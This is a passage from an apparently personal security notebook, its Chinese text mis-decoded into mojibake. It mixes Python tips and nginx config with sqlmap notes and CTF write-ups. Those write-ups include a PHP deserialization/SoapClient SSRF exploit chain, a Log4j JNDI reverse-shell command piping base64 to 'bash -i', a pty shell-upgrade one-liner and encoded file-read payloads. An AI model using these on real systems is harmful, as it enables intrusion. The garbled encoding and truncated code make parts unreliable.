print(dir(__builtins__))#æŸ¥çœ‹built-inç©ºé—´ï¼ˆå°±æ˜¯pythonçš„å†…ç½®å‡½æ•°å’Œæ¨¡å—ï¼‰ #global {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': , '__spec__': None, '__annotations__': {}, '__builtins__': , '__file__': 'd:\\\\python3.8\\\\code\\\\1.py', '__cached__': None, 'test': } å› ä¸ºåœ¨my_funcä¸­å…ˆä½¿ç”¨äº†å˜é‡aprint(f\"iprefix} {a}\"),ç„¶åæ‰åœ¨my_funcä¸­å£°æ˜äº†å˜é‡a,æ‰€ä»¥æŠ¥é”™ã€‚ åœ¨my_funcä¸­å£°æ˜äº†global a,æ‰€ä»¥pythonçŸ¥é“localç©ºé—´ä¸­çš„aæŒ‡å‘globalç©ºé—´ä¸­çš„aã€‚ æ‰€ä»¥åœ¨localä¸­æ”¹å˜açš„å€¼ï¼Œä¼šå½±å“globalä¸­çš„aã€‚ åŸæœ¬åœ¨globalç©ºé—´ä¸­æ²¡æœ‰å˜é‡a,ä½†æ˜¯åœ¨localä¸­å£°æ˜äº†global aï¼Œpythonä¼šè‡ªåŠ¨åœ¨globalä¸­åˆ†é…ç©ºé—´ç»™å˜é‡aã€‚ ä½œè€…è¯´it's bad codeğŸ˜„ globals()è¿”å›çš„æ˜¯å­—å…¸å½¢å¼ï¼Œå¯ä»¥é€šè¿‡é”®å€¼ç´¢å¼•çš„æ–¹å¼è®¿é—®ã€‚ å¦‚ä½•å±•ç¤ºå‡½æ•°çš„localç©ºé—´ä¸­ä¿å­˜çš„å˜é‡ å‡½æ•°çš„bodyä¸­print(locals()) é€šè¿‡å‡½æ•°çš„codeæ–¹æ³•ä¸‹çš„å±æ€§è®¿é—® a=10 def test(): x=20 def test2(): global x x=10 test2() print(x) test() print(x) nonlocalç”¨äºå¯»æ‰¾åŒä¸ºlocalç©ºé—´çš„å˜é‡ nonlocal means, not in the current function's local scope and neither in the global scope nonlocalçš„å¯»æ‰¾èŒƒå›´ï¼šä¸Šä¸€çº§localç©ºé—´åˆ°globalç©ºé—´çš„ä¸‹ä¸€çº§ è™½ç„¶globalä¸­å£°æ˜äº†å˜é‡aï¼Œä½†æ˜¯nonlocalè¿˜æ˜¯æ‰¾ä¸åˆ°å˜é‡a å³ä½¿åœ¨localä¸­å£°æ˜äº†global a,nonlocalä»ç„¶æ‰¾ä¸åˆ°å˜é‡a æ‰€ä»¥nonlocalçš„å¯»æ‰¾èŒƒå›´ï¼šä¸Šä¸€çº§localç©ºé—´åˆ°globalç©ºé—´çš„ä¸‹ä¸€çº§ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-08-27 11:41:34 "},"05.ç¼–ç¨‹å¼€å‘/Python/pythonæŠ€å·§.html":{"url":"05.ç¼–ç¨‹å¼€å‘/Python/pythonæŠ€å·§.html","title":"pythonæŠ€å·§","keywords":"","body":"è¾“å‡ºåˆ—è¡¨å…ƒç´  lis=[1,2,3] print(lis[1:]) print(*lis[1:]) >> [2, 3] 2 3 åŒæ—¶è·å¾—å…ƒç´ ä¸å…ƒç´ ç´¢å¼• lis = ['a','b','c'] for index,i in enumerate(lis): print(index,i) >> 0 a 1 b 2 c å­—ç¬¦ä¸²æ ¼å¼åŒ– ç±»ä¼¼cè¯­è¨€ # %s å­—ç¬¦ä¸²å ä½ print(\"%s\"%'abcd') # %c å­—ç¬¦å ä½ print(\"%c\"%'a') format (ä¼šè‡ªåŠ¨å°†å˜é‡è½¬ä¸ºstr) print(\"{}{}\".format(1,2)) a=1 b=2 print(f'{a}{b}') >> 12 12 å ä½ç¬¦æ ¼å¼åŒ–https://blog.csdn.net/u014770372/article/details/76021988 äº¤æ¢æ•°å€¼ a=1 b=2 a,b=b,a print(a,b) >>2 1 æ¨å¯¼å¼ [æƒ³å¾—åˆ°çš„å˜é‡å½¢å¼ for å˜é‡ in å¯è¿­ä»£å¯¹è±¡ if æ¡ä»¶è¡¨è¾¾å¼] #æ‰¾å‡ºåˆ—è¡¨é‡Œå¤§äº0çš„æ•° shu=[1,2,3,-1,-2,-3] print([i for i in shu if i>0]) >>[1,2,3] #ç»Ÿè®¡ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æ¯ä¸ªå­—ç¬¦å‡ºç°çš„æ¬¡æ•° m = 'I am Khazking!' n = {i:m.count(i) for i in m} print(n) >>{'I': 1, ' ': 2, 'a': 2, 'm': 1, 'K': 1, 'h': 1, 'z': 1, 'k': 1, 'i': 1, 'n': 1, 'g': 1, '!': 1} å­—ç¬¦ä¸²æ›¿æ¢ #repalceæ–¹æ³•åªèƒ½å®ç°å…ƒç´ ä¸€å¯¹ä¸€æ›¿æ¢ #ä½¿ç”¨ä¸‹è¿°æ–¹æ³•å¯ä»¥å®ç°bæ›¿æ¢ä¸ºz,zæ›¿æ¢ä¸ºb #å»ºç«‹æ˜ å°„å…³ç³»å­—å…¸ a='zbbz' table = ''.maketrans('bz','zb')#ç­‰ä»·äº table= {'b':'z','z':'b'} a = a.translate(table) print(a) >>bzzb å„ç§æ’åº reverse=Trueé™åºï¼Œé»˜è®¤ä¸ºå‡åº å­—å…¸æ’åº # æŒ‰é”®å€¼æ’åº sorted(dic.items(),key=lambda item:item[1],reverse=True) # æŒ‰é”®åæ’åº sorted(dic.items(),key=lambda item:item[0],reverse=True) åµŒå¥—æ’åº # å­—å…¸åµŒå¥— {'a': [1, 3], 'c': [3, 4], 'b': [0, 2], 'd': [2, 1]} sorted(dic.items(), key=lambda x: x[1][1], reverse=True) # æŒ‰é”®å€¼ï¼ˆåˆ—è¡¨ï¼‰çš„ç¬¬äºŒä¸ªå…ƒç´ æ’åˆ— # åˆ—è¡¨åµŒå¥— [['é‡‘ç‰›', 89000, 13140.196950444726, 2800, 1574], ['é”¦æ±Ÿ', 113800, 18719.342387419587, 2550, 1399], ['æˆå', 96400, 14034.861538461539, 2300, 1300], ['é«˜æ–°', 160000, 23663.31254871395, 3600, 1283], ['æ­¦ä¾¯', 102000, 19768.739789964995, 3100, 857]] sorted(lis, key = lambda k : k[2],reverse= True) # æŒ‰æ¯ä¸ªå­åˆ—è¡¨çš„ç¬¬ä¸‰ä¸ªå…ƒç´ æ’åˆ— ä¿®æ”¹ä¸‹æ ‡å³å¯æŒ‰ç…§å…¶ä»–å…ƒç´ è¿›è¡Œæ’åˆ—ã€‚ ç»Ÿè®¡å­—ç¬¦å‡ºç°çš„é¢‘ç‡ from random import randint from collections import Counter data = [randint(0,20) for i in range(30)] s = dict.fromkeys(data,0) print(s) for i in data: s[i]+=1 # ç»Ÿè®¡å­—ç¬¦å‡ºç°æ¬¡æ•° print(s) #ç»Ÿè®¡sä¸­å‡ºç°é¢‘ç‡æœ€é«˜çš„ä¸‰ä¸ªæ•° print (Counter(s).most_common(3)) ä»åºåˆ—ä¸­ç­›é€‰å‡ºç¬¦åˆæ¡ä»¶çš„å…ƒç´  from random import randint #filter(function, iterable) data = [randint(-10,10) for i in range(10)] data = list(filter(lambda x:x>=0,data)) print(data) #æˆ–è€…åˆ—è¡¨æ¨å¯¼å¼ ä¸´æ—¶æ–‡ä»¶ æˆ‘ä»¬é‡‡é›†æ•°æ®è¿›è¡Œåˆ†æï¼Œä½†æ˜¯æˆ‘ä»¬åªéœ€è¦ä¿å­˜ç»“æœï¼Œæˆ‘ä»¬é‡‡é›†çš„æ•°æ®å¦‚æœå¸¸é©»å†…å­˜å°±ä¼šè®©ç”µè„‘å´©æºƒï¼Œäºæ˜¯æˆ‘ä»¬å°†è¿™ä¸ªæ•°æ®æ”¾åœ¨ä¸´æ—¶æ–‡ä»¶ä¸­ï¼ˆå¤–éƒ¨å­˜å‚¨ï¼‰ï¼Œåœ¨æ–‡ä»¶å…³é—­åå°†è¢«åˆ é™¤ from tempfile import TemporaryFile,NamedTemporaryFile f = TemporaryFile() f.write(b'abc'*10000) f.seek(0) a=f.read(100) print(a) è¿™ä¸ªä¸´æ—¶æ–‡ä»¶åœ¨ç³»ç»Ÿä¸­æ˜¯æ‰¾ä¸åˆ°çš„ï¼Œå¦‚æœæˆ‘ä»¬æƒ³åˆ›å»ºä¸€ä¸ªèƒ½åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­çœ‹åˆ°çš„ä¸´æ—¶æ–‡ä»¶ï¼Œæˆ‘ä»¬å°±ç”¨NamedTemporaryFile nte = NamedTemporaryFile(delete=false)#deleteå‚æ•°ä¸ºfalseæ—¶ç¨‹åºè¿è¡Œå®Œï¼Œä¸´æ—¶æ–‡ä»¶ä¹Ÿä¸ä¼šè¢«åˆ é™¤ print(nte.name) ç©·ä¸¾ç»„åˆ #å…¨æ’åˆ— from itertools import permutations #permutations()è¿”å›çš„æ˜¯tupleç±»å‹ï¼Œæ‰€è¦è¦ç”¨''.join(i)è¿æ¥èµ·æ¥ for i in permutations('123',2): print(''.join(i),end=' ') æ¨¡æ‹Ÿç»ˆç«¯ import pty;pty.spawn('/bin/bash') äºŒè¿›åˆ¶æ–‡ä»¶åŸåœ°ä¿®æ”¹ import os import mmap def memory_map(filename, access=mmap.ACCESS_WRITE): size = os.path.getsize(filename) fd = os.open(filename, os.O_RDWR) return mmap.mmap(fd, size, access=access) m = memory_map('data') >>> len(m) 1000000 >>> m[0:10] b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' è„šæœ¬å‚æ•° python xx.py aa sys.argv[0]â†’xx.py sys.argv[1]â†’aa import argparse parser = argparse.ArgumentParser() parser.add_argument(\"-u\",\"--url\", type=str, help=\"target url\") parser.add_argument(\"-t\", \"--threads\" , type=int, help=\"threads num\") args = parser.parse_args() >> python xx.py -u xx.com -t 20 args.url=xx.com args.threads=20 Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-27 17:13:21 "},"05.ç¼–ç¨‹å¼€å‘/å·¥å…·åŸç†/sqlmap.html":{"url":"05.ç¼–ç¨‹å¼€å‘/å·¥å…·åŸç†/sqlmap.html","title":"Sqlmap","keywords":"","body":" sqlmap é¡¹ç›®å‰–æ1 sqlmap é¡¹ç›®å‰–æ2 sqlmap é¡¹ç›®å‰–æ3 sqlmap ä½¿ç”¨ä¸€ç§æå…¶å·§å¦™çš„æ–¹å¼ç»„åˆç”Ÿæˆä¸€ä¸ªå®Œæ•´çš„ payloadï¼Œä¸€ä¸ªå®Œæ•´çš„ payload ç”±å¦‚ä¸‹å‡ ä¸ªéƒ¨åˆ†ç»„æˆï¼š å…¶ä¸­ prefixã€commentã€suffix ä½œä¸º boundaryï¼Œboundary ç”¨äºé—­åˆæ³¨å…¥ç‚¹çš„å‰åéƒ¨åˆ†ï¼›test åˆ™æ˜¯æœ€ç»ˆå¦‚æœé—­åˆæˆåŠŸåå¿…ç„¶æ‰§è¡Œçš„è¯­å¥ã€‚ å› æ­¤ sqlmap å°† prefix ä¸ suffix å•ç‹¬ä½œä¸º boundaries ä¿å­˜ï¼Œè€Œ test å’Œ comment åˆ™æ ¹æ®æ³¨å…¥æ–¹å¼å’Œæ•°æ®åº“çš„ä¸åŒè¢«åˆ’åˆ†ä¸ºå…­ä¸ªæ–‡ä»¶ï¼ˆè·¯å¾„ï¼š/data/xml/payloadsï¼‰ sqlmap é¡¹ç›®å‰–æ4 å¸ƒå°”æ³¨å…¥ å…ˆå‘é€ä¸€ä¸ª false è¯·æ±‚ï¼Œå¦‚æœç»“æœä¸åŸé¡µé¢ç›¸åŒå°±åˆ¤æ–­ä¸å­˜åœ¨å¸ƒå°”æ³¨å…¥ å¦‚æœä¸ç›¸åŒå‘é€ä¸€ä¸ª true è¯·æ±‚,å¦‚æœä¸åŸé¡µé¢ç›¸ä¼¼ åˆ™å†å‘é€ä¸€ä¸ª false è¯·æ±‚ï¼Œç„¶åæŠŠè¿™ä¸¤æ¬¡è¿”å›çš„ç»“æœå–å·®é›†ï¼Œè®¡ç®—å‡ºTrueæ—¶çš„flagæ ‡è¯†ï¼Œä¹Ÿå°±æ˜¯sqlmapçš„-stringå‚æ•° æŠ¥é”™æ³¨å…¥ å‘é€æŠ¥é”™payloadï¼Œå¦‚æœèƒ½å¤Ÿæ­£åˆ™åŒ¹é…åˆ°åˆ™è¯´æ˜å­˜åœ¨æŠ¥é”™æ³¨å…¥ã€‚ å»¶æ—¶æ³¨å…¥ å…ˆå‘é€Nä¸ªæ­£å¸¸è¯·æ±‚ï¼Œç„¶åè®¡ç®—è¿™Nä¸ªè¯·æ±‚å“åº”æ—¶é—´çš„æ ‡å‡†å·®å’Œæ­£å¸¸è¯·æ±‚çš„æœ€é•¿å“åº”æ—¶é—´ ç„¶åå‘é€ä¸€ä¸ªå»¶æ—¶è¯·æ±‚ï¼Œåˆ¤æ–­æ˜¯å¦åœ¨åŒºé—´å†… è”åˆæŸ¥è¯¢æ³¨å…¥ ç”¨order byå’ŒäºŒåˆ†æ³•æ¥åˆ¤æ–­åˆ—æ•° éå†åˆ—æ•°åˆ¤æ–­å“ªä¸€åˆ—æ˜¯å›æ˜¾ç‚¹ å‘é€payload sqlmapæºç åˆ†æä¸å­¦ä¹  sqlmap æµç¨‹è„‘å›¾ os-shell åŸç† sqlmap --os-shellåŸç† Sqlmapä¹‹os-shellåŸç†åˆ†æ æ”»é˜² å®æˆ˜sqlmapç»•è¿‡WAF sqlmap --os-shellååˆ¶å°æ€è·¯ å…¥ä¾µæ£€æµ‹ä¹‹sqlmapæ¶æ„æµé‡åˆ†æ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-25 23:21:05 "},"05.ç¼–ç¨‹å¼€å‘/Nginx.html":{"url":"05.ç¼–ç¨‹å¼€å‘/Nginx.html","title":"Nginx","keywords":"","body":"http { # è´Ÿè½½å‡è¡¡ï¼Œweightè½®è¯¢çš„æƒé‡ upstream backend { least_conn; server backend1.example.com weight=3 max_fails=3 fail_timeout=30s; server backend2.example.com weight=2 max_fails=3 fail_timeout=30s; server backend3.example.com weight=1 max_fails=3 fail_timeout=30s; } # è½¬å‘åˆ°å†…ç½‘å…¶ä»–æœåŠ¡å™¨ server { listen 80; server name åŸŸå; location / { proxy_pass http://backend; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; deny 127.0.0.1; #æ‹’ç»çš„ip allow 172.18.5.54; #å…è®¸çš„ip } } server { listen 80; server_name demo.åŸŸå.com; location / { charset utf-8; root /electronic-book-demo/build/; index index.html index.htm; } } } Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-18 16:46:41 "},"06.WriteUp/CTF/2022å®‰æ´µæ¯.html":{"url":"06.WriteUp/CTF/2022å®‰æ´µæ¯.html","title":"2022 å®‰æ´µæ¯","keywords":"","body":"web babyphp çŸ¥è¯†ç‚¹ ä¸buu--bestphpâ€˜s revengeå·®ä¸å¤š session+ååºåˆ—åŒ– åŸç”Ÿç±»SSRF+æ–‡ä»¶æ“ä½œ æ€è·¯ ç¬¬ä¸€æ­¥ï¼Œè®¾ç½®phpçš„sessionè§£æå™¨ï¼Œä½¿å¾—ä¸‹ä¸€æ¬¡ä¼šè¯æ—¶sessionä¸­ä¿å­˜çš„æ˜¯æ„é€ å¥½çš„SoapClientå¯¹è±¡ã€‚ SoapClientå¯¹è±¡ $target, 'user_agent'=>'khaz^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string, 'uri'=>'hello')); $aaa = serialize($b); $aaa = str_replace('^^',\"\\r\\n\",$aaa); echo \"|\".urlencode($aaa); ç¬¬äºŒæ­¥ï¼Œååºåˆ—åŒ–è§¦å‘SoapClientçš„callæ–¹æ³•ï¼Œä»è€Œå¯¼è‡´SSRFï¼Œä»è€Œå°†flagä¿å­˜åˆ°SSRFè¯·æ±‚å¯¹åº”çš„sessionä¸­ã€‚ popï¼š B::destruct â†’ C::toString â†’ A::invoke â†’ C::uwant a = \"babyhacker\"; } public function __invoke() { echo \"è§¦å‘invoke\\n\"; echo $a.\"\\n\"; if (isset($this->a) && $this->a == md5($this->a)) { $this->b->uwant(); } } } class B { public $a; public $b; public $k; function __destruct() { echo \"è§¦å‘destruct\\n\"; $this->b = $this->k; die($this->a); } } class C { public $a='getflag'; public $c; public function __toString() { echo \"è§¦å‘toString\\n\"; $cc = $this->c; return $cc(); } public function uwant() { echo \"è§¦å‘uwant\\n\"; if ($this->a == \"phpinfo\") { phpinfo(); } else { call_user_func(array(reset($_SESSION), $this->a)); } } } $a = new A(); $b = new B(); $c = new C(); $c2 =new C(); $b->a = $c; $c->c = $a; $a->a = \"0e215962017\"; $a->b = $c2; $result = serialize($b); // echo $result; $x=str_replace('O:1:\"A\":2:', 'O:1:\"A\":3:',$result);//ç»•è¿‡__wakeup() echo urlencode($x); è¿™é‡Œçš„500æ˜¯å› ä¸ºC::tostring()çš„æŠ¥é”™ï¼Œè€Œä¸æ˜¯ååºåˆ—åŒ–å‡ºé”™ã€‚ ç¬¬ä¸‰æ­¥ï¼Œä¿®æ”¹cookieä¸­çš„PHPSESSIONIDä¸ºSSRFè¯·æ±‚çš„PHPSESSIONIDï¼Œè¯»å–åˆ°flagã€‚ æŸ¥çœ‹flagæ–‡ä»¶åçš„ç»“æœ easy_upload--å¤ç° dirsearchæ‰«ææ²¡æœ‰å‘ç°å…¶ä»–é¡µé¢ã€‚ åªæœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ç‚¹ å…ˆä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œå‘ç°æœ‰è¿‡æ»¤ å°è¯•å›¾ç‰‡+.htaceess å‘ç°åªæ¥å—.phpæ–‡ä»¶ï¼Œé‚£ä¹ˆå°±æ˜¯è¦ç»•è¿‡æ–‡ä»¶å†…å®¹è¿‡æ»¤ã€‚ ç»æµ‹è¯•å‘ç° $ ` * è¿˜æœ‰å¾ˆå¤šå‡½æ•°è¢«è¿‡æ»¤ ä»¥ä¸‹å¯ä»¥ åœ¨phpinfoä¸­å¯ä»¥å‘ç°disable_functionç¦ç”¨äº†å‡ ä¹æ‰€æœ‰çš„å‡½æ•°ã€‚ ä½†æ˜¯æ²¡æœ‰ç¦ç”¨file_get_contentsè¿™ä¸ªè¯»å–æ–‡ä»¶çš„å‡½æ•°ã€‚æ‰€ä»¥åªè¦èƒ½æ‰¾åˆ°flagçš„è·¯å¾„å°±å¯ä»¥äº†ã€‚ ç½‘ä¸Šçš„å¸ˆå‚…åšæ³•æ˜¯åˆ©ç”¨åŸç”Ÿç±»æ¥æ‰¾åˆ°è·¯å¾„ï¼Œåˆ©ç”¨phpå­—ç¬¦ä¸²è§£ææ¥ç»•è¿‡å­—ç¬¦è¿‡æ»¤ã€‚ payload æŸ¥æ‰¾è·¯å¾„ # \\147\\154\\157\\142\\72\\57\\57\\57\\146\\52 â†’ glob:///f* è¯»å–flag # \\146\\151\\154\\145\\137\\147\\145\\164\\137\\143\\157\\156\\164\\145\\156\\164\\163 â†’ file_get_contents misc flybenben--å¤ç° CEä¿®æ”¹ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-27 17:15:03 "},"06.WriteUp/CTF/bugkuåº”æ€¥å“åº”.html":{"url":"06.WriteUp/CTF/bugkuåº”æ€¥å“åº”.html","title":"bugku åº”æ€¥å“åº”","keywords":"","body":"jsåŠ«æŒ cat `find /var/www/html -name \"6127418cad73c.php\"` find . | xargs grep -ri '' -l | sort | uniq -c é€šè¿‡xssçš„ç‰¹å¾å†…å®¹æ¥å®šä½å¯ç–‘æ–‡ä»¶ åå¼¹shellåé—¨ å¤„ç†ï¼š åˆ é™¤æ–‡ä»¶ æ€æ‰è¿›ç¨‹ å‘½ä»¤åŠ«æŒ æ•°æ®åº“ä¿®å¤ MySQLä¹‹æƒé™ç®¡ç† - Iâ€™m Me! - åšå®¢å›­ revoke file on *.* from 'root'@'localhost'; # æ”¶å›æ–‡ä»¶æƒé™ set global general_log = off; # ä¸å¯ç”¨æ—¥å¿— flush privileges; # åˆ·æ–°æƒé™ ç”¨æˆ·åˆ é™¤ ç›´æ¥åˆ å°±å®Œäº‹äº† é¦–æ¬¡æ”»å‡» ç­›é€‰äº†ipå’ŒçŠ¶æ€ç ï¼Œç„¶åæ‰¾çš„ã€‚ å‘ç°å®‰è£…äº†phpmyadminï¼Œé‚£ä¹ˆå¾ˆå¤§æ¦‚ç‡æ˜¯é€šè¿‡æ•°æ®åº“æ”»å…¥çš„ã€‚ ç™»å½•phpmyadminåå°æŸ¥çœ‹äºŒè¿›åˆ¶æ—¥å¿—ï¼Œå¾ˆæ˜æ˜¾çœ‹å‡ºæ¥è¿™ä¸ªæ˜¯ä½¿ç”¨udfåˆ›å»ºæ¶æ„å‡½æ•°sys_evalææƒ # æŸ¥çœ‹è¿™äº›ç›®å½•æ˜¯å¦æœ‰æ–‡ä»¶ï¼Œå¾ˆå¯èƒ½æœ‰ææƒ mysql\\lib\\plugin c:/windows/system32/wbem/mof/ ä¿®å¤ åœ¨my.iniä¸­æ·»åŠ å¦‚ä¸Šè®¾ç½®ï¼Œä¸å…è®¸å¯¼å…¥å’Œå¯¼å‡ºã€‚ è¿›è¡Œmysqlæ—¥å¿—åˆ†æï¼Œé€šè¿‡å®šä½sys_evalæ¥æŸ¥æ‰¾æ”»å‡»è€…è¿›è¡Œäº†å“ªäº›æ“ä½œ åªè¿›è¡Œäº†æ·»åŠ ç”¨æˆ·çš„æ“ä½œ ç›´æ¥åˆ é™¤è¯¥ç”¨æˆ· æŸ¥æ€websehll ä½¿ç”¨æ—¥å¿—åˆ†æå·¥å…· ï¼ˆè·Ÿè¸ªipçš„è®¿é—®ï¼‰ åé—¨æŸ¥æ€ æœ¨é©¬ä½ç½®åœ¨å¯åŠ¨é¡¹ é€šè¿‡èµ„æºç›‘è§†å™¨å¾—åˆ°è¯¥æœ¨é©¬å¤–è”åœ°å€ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-27 17:08:54 "},"06.WriteUp/CTF/HNCTF.html":{"url":"06.WriteUp/CTF/HNCTF.html","title":"HNCTF 2022","keywords":"","body":"web [HNCTF 2022 WEEK3]Fun_php $getUserID = @$_GET['user']; $getpass = (int)@$_GET['pass']; $getmySaid = @$_GET['mySaid']; $getmyHeart = @$_GET['myHeart']; $data = @$_POST['data']; $verify =@$_POST['verify']; $want = @$_POST['want']; $final = @$_POST['final']; if(is_string($getUserID)) $user = $user + $getUserID; //u5er_D0_n0t_b3g1n_with_4_numb3r if($user == 114514 && $getpass == $pass){ if (!ctype_alpha($getmySaid)) die(); if (!is_numeric($getmyHeart)) die(); if(md5($getmySaid) != md5($getmyHeart)){ die(\"Cheater!\"); } else $week_1 = true; } å­—ç¬¦ä¸²ä¸æ•°å­—å¼±æ¯”è¾ƒ u5er_D0_n0t_b3g1n_with_4_numb3r 'sdasd114514' == 114514 get --> user=114514 çŒœæµ‹$passä¸ºå­—ç¬¦ä¸² 'dbasdha' == 0 //True get --> pass=0 å­—ç¬¦ä¸²ä¸æ•°å­—MD5ç›¸ç­‰ ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡ 0eå¼€å¤´çš„æ•°å­—å­—ç¬¦ä¸² s214587387a 1586264293 if(is_array($data)){ for($i=0;$i array_searché»˜è®¤å¼±æ¯”è¾ƒæŸ¥æ‰¾,è¿”å›æŸ¥æ‰¾æˆåŠŸå…ƒç´ çš„ä¸‹æ ‡ post --> data[]=0 if($week_1 && $week_2){ if(md5($data)===md5($verify)) // â€®â¦HNCTFâ©â¦Welcome to if (\"hn\" == $_GET['hn'] &â€®â¦+!!â©â¦& \"â€®â¦ Flag!â©â¦ctf\" == $_GET[â€®â¦LAGâ©â¦ctf]) { //HN! flag!! F if(preg_match(\"/php|\\fl4g|\\\\$|'|\\\"/i\",$want)Or is_file($want)) die(\"HACK!\"); else{ echo \"Fine!you win\"; system(\"cat ./$want\"); } } else die(\"HACK!\"); } md5å¼±æ¯”è¾ƒï¼Œæ•°ç»„ç»•è¿‡ post --> data[]=0&verify[]=1 é›¶å®½åº¦éšå†™ï¼Œï¼Ÿï¼Ÿï¼Ÿï¼Ÿ get --> hn=hn&%E2%80%AE%E2%81%A6LAG%E2%81%A9%E2%81%A6ctf=%E2%80%AE%E2%81%A6%20Flag!%E2%81%A9%E2%81%A6ctf if(preg_match(\"/php|\\fl4g|\\\\$|'|\\\"/i\",$want)Or is_file($want)) é€šé…ç¬¦ç»•è¿‡ post --> want=f* [HNCTF 2022 WEEK3]logjjjjlogjjjj å¤ç°ï¼šhttps://blog.csdn.net/weixin_47179815/article/details/125654828 æœ¬åœ°ç¯å¢ƒï¼šJDKç‰ˆæœ¬1.8 æ”»å‡»æµç¨‹ æœåŠ¡å™¨è¿è¡Œæ”»å‡»è„šæœ¬ç”Ÿæˆpayload java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \"bash -c {echo,base64(åå¼¹shell)}|{base64,-d}|{bash,-i}\" -A æœåŠ¡å™¨ip æœåŠ¡å™¨ç›‘å¬ç«¯å£ å‘é€payload ${jndi:xxx://xxxx/xxx} å°†ä¸Šé¢ç”Ÿæˆçš„payloadæ”¾å…¥ï¼ˆä¼˜å…ˆJDKï¼‰ URLç¼–ç åå‘é€è¯·æ±‚ æˆåŠŸè¿æ¥ misc ç®€å•ç¼–ç  å›¾ç‰‡å°¾éƒ¨æœ‰ä¸€ä¸²urlç¼–ç åçš„å­—ç¬¦ [HNCTF 2022 Week1]çº¿ä¸‹å•æ€å‡ºé¢˜äººï¼ˆOSINT) é¦–å…ˆä»Aå›¾ç‰‡ä¸­æå–å‡ºç»çº¬åº¦ å› ä¸ºè¿™ä¸ªç»çº¬åº¦æ˜¯åº¦åˆ†ç§’çš„å½¢å¼ï¼Œéœ€è¦å…ˆè½¬æ¢ä¸ºåº¦æ•°å½¢å¼ æ ¼å¼è½¬æ¢ï¼šhttp://www.gzhatu.com/du2dfm.html å®šä½ï¼šhttp://www.gzhatu.com/dingwei.html Aå›¾ç‰‡ä¸­è¿˜æœ‰ä¸€ä¸ªæç¤º æ‰€ä»¥å¯ä»¥ç¡®å®šå®šä½æ˜¯æ­£ç¡®çš„ã€‚ ç„¶åæ ¹æ®ç¬¬äºŒå¼ å›¾ä¸­çš„æ²³æµå¯ä»¥çŸ¥é“æ˜¯å¾€å“ªæ¡è·¯èµ°çš„ã€‚ ç”¨é«˜å¾·åœ°å›¾å®šä½å˜‰å…´ç”µä¿¡å¤§å¦ï¼Œå¾€é‚£æ¡è·¯æ‰¾ï¼Œæ‰¾åˆ° flag from hashlib import md5 print(md5('å˜‰å…´å¸‚å—æ¹–åŒºç¦¾å…´åŒ—è·¯506å·äºšèŠ¬æ±€ç²¾å“é…’åº—'.encode('utf-8')).hexdigest())#utf-8ç¼–ç  SSCTF{f833a4d17d35ca5da40f087950293d04} ä¹Ÿå¯ä»¥ç”¨exifå·¥å…·æŸ¥çœ‹ [HNCTF 2022 Week1]ä¸‰ç”Ÿä¸‰ä¸– å¼±å¯†ç çˆ†ç ´ï¼Œå›¾ç‰‡base64éšå†™å¾—åˆ°äºŒç»´ç ï¼Œæ‰«æåç”¨æ …æ å¯†ç è§£å¯†ï¼Œæ¯ç»„å­—æ•°ä¸º3. [HNCTF 2022 Week1]silly_zip ä¼ªåŠ å¯†+IHDRä¿®æ”¹ [HNCTF 2022 Week1]piz.galf ä¸¤æ¬¡é€†åº f = open(r\"C:\\Users\\khaz\\Downloads\\pmb.galf\" , 'rb' ).read() f2 = open(r\"C:\\Users\\khaz\\Downloads\\flag.bmp\" , \"wb\") f2.write(f[ ::-1]) Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-27 17:47:14 "},"06.WriteUp/CTF/misc.html":{"url":"06.WriteUp/CTF/misc.html","title":"MISC","keywords":"","body":"wikiï¼šhttps://cuccs.github.io/ctf-wiki/MISC/MISC-2/MISC-2/ ç¼–ç ï¼šhttps://cloud.tencent.com/developer/article/1749430 å¥‡å¥‡æ€ªæ€ªè§£å¯†ï¼šhttps://www.dcode.fr/ brain_fuck:https://www.splitbrain.org/services/ook miscé«˜æ‰‹åšå®¢ï¼šhttp://www.ga1axy.top/index.php/archives/6 https://zhouhaobusy.com/ jphideï¼šã€éšå†™å·¥å…·ã€‘ã€è¯•ä¸€è¯•ï¼Ÿã€‘jphide seekï¼ˆJPHSï¼‰ ä½¿ç”¨æ–¹æ³•,æ£€æµ‹æç¤ºï¼Œé™„ä¸‹è½½åœ°å€_é»‘è‰²åœ°å¸¦(å´›èµ·)çš„åšå®¢-CSDNåšå®¢_jphsä½¿ç”¨ usbæµé‡åˆ†æï¼šUSBæµé‡åˆ†æ æ‹¼å›¾æ•™ç¨‹ï¼šhttps://blog.csdn.net/qq_51999772/article/details/122425898 è¿˜åŸæ‹¼å›¾gapså®‰è£…ï¼šhttps://blog.csdn.net/ZT7524/article/details/119981204 gapsçš„sizeå‚æ•°=å±æ€§ä¸­çš„åƒç´ å€¼/ç¢ç‰‡ä¸ªæ•° äºŒç»´ç 